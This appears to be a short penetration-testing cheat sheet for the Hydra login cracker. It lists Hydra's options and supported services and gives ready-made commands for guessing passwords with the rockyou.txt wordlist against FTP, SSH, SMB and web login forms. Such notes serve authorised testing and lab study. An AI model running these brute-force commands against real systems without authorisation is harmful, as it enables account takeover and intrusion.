# Hydra



```bash
# -s PORT: if the service is on a different default port, define it here
# -v: verbose mode 
# -V: show login+pass for each attempt
# -d: debug mode

Services:
# adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] 
# http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum 
# icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql 
# mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 
# rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp  
# socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
```

## FTP Brute Forcing

```bash
hydra -l USER -P rockyou.txt ftp://IP
hydra -l USER -P rockyou.txt IP -t 4 ftp
```

## SSH Brute Forcing

```bash
hydra -l USER -P rockyou.txt IP -t 4 ssh
```

## SMB Brute Forcing

```bash
hydra -l USER -P rockyou.txt IP smb
```

## Web Form Brute Forcing

{% code fullWidth="false" %}
```bash
hydra -l USER -P rockyou.txt $IP http-post-form "/path:param1=^USER^&$param2=^PASS^:error_message" -V
# insert all req params in http-post-form flag
```
{% endcode %}
